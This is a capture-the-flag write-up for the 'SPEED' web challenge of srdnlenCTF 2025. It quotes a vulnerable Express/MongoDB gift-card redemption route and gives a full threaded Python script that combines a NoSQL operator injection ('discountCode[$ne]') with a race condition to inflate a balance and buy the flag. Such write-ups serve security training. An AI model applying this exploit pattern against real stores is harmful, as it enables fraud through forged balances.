## Question
Welcome to Radiator Springs' finest store, where every car enthusiast's dream comes true! But remember, in the world of racing, precision matters—so tread carefully as you navigate this high-octane experience. Ka-chow!

## Solution
Opening the site, this is what we see.
![image](https://github.com/user-attachments/assets/95d22d1a-cc20-4edc-b23d-10a801e15dd4)

The objective was to buy the most expensive item in the store to access and read the flag.
![image](https://github.com/user-attachments/assets/2aabb838-fae8-46d6-9ecf-212ab58d0407)

Continuing to read the [source code](https://github.com/Rishblol/CTF-Writeups/tree/main/srdnlenCTF'25/files/SPEED), we go to the `/redeem` section of the site.
```javascript
router.get('/redeem', isAuth, async (req, res) => {
    try {
        const user = await User.findById(req.user.userId);

        if (!user) {
            return res.render('error', { Authenticated: true, message: 'User not found' });
        }

        // Now handle the DiscountCode (Gift Card)
        let { discountCode } = req.query;
        
        if (!discountCode) {
            return res.render('error', { Authenticated: true, message: 'Discount code is required!' });
        }

        const discount = await DiscountCodes.findOne({discountCode})

        if (!discount) {
            return res.render('error', { Authenticated: true, message: 'Invalid discount code!' });
        }

        // Check if the voucher has already been redeemed today
        const today = new Date();
        const lastRedemption = user.lastVoucherRedemption;

        if (lastRedemption) {
            const isSameDay = lastRedemption.getFullYear() === today.getFullYear() &&
                              lastRedemption.getMonth() === today.getMonth() &&
                              lastRedemption.getDate() === today.getDate();
            if (isSameDay) {
                return res.json({success: false, message: 'You have already redeemed your gift card today!' });
            }
        }

        // Apply the gift card value to the user's balance
        const { Balance } = await User.findById(req.user.userId).select('Balance');
        user.Balance = Balance + discount.value;
        // Introduce a slight delay to ensure proper logging of the transaction 
        // and prevent potential database write collisions in high-load scenarios.
        new Promise(resolve => setTimeout(resolve, delay * 1000));
        user.lastVoucherRedemption = today;
        await user.save();

        return res.json({
            success: true,
            message: 'Gift card redeemed successfully! New Balance: ' + user.Balance // Send success message
        });

    } catch (error) {
        console.error('Error during gift card redemption:', error);
        return res.render('error', { Authenticated: true, message: 'Error redeeming gift card'});
    }
});
```
This is perfect grounds for a NoSQL injection.\
We can exploit this by writing a Python script and we'll get the flag.\
```python
import requests
from faker import Faker
from bs4 import BeautifulSoup
import threading

s = []
snum = 20
fake = Faker()
url = "http://speed.challs.srdnlen.it:8082/"

data = {
        "username":fake.user_name(),
        "password":fake.password()
        }

## NoSQLInjection
def req(i):
    s[i].get(url + "redeem?discountCode[$ne]=test")
    
th = []

## Race Condition
for i in range(snum):
    s.append(requests.Session())
    
    if i == 0:
        s[i].post(url + "register-user", json=data)
    
    s[i].post(url + "user-login", json=data)
    
    x = threading.Thread(target=req, args=(i,))
    th.append(x)
    
for i in range(snum):
    th[i].start()
    
for i in range(snum):
    th[i].join()

## Login  
session = requests.Session()  
session.post(url + "user-login", json=data).text

## Flag purchase
session.post(url + "store", json={"productId": 4})

## Flag extraction
print("\nFLAG: " + BeautifulSoup(session.get(url, timeout=20).text, 'html.parser').find('p', class_='card-text', string=lambda t: t and 'Flag:' in t).get_text().split('Flag: ')[1])
```
`flag: srdnlen{6peed_1s_My_0nly_Competition}`

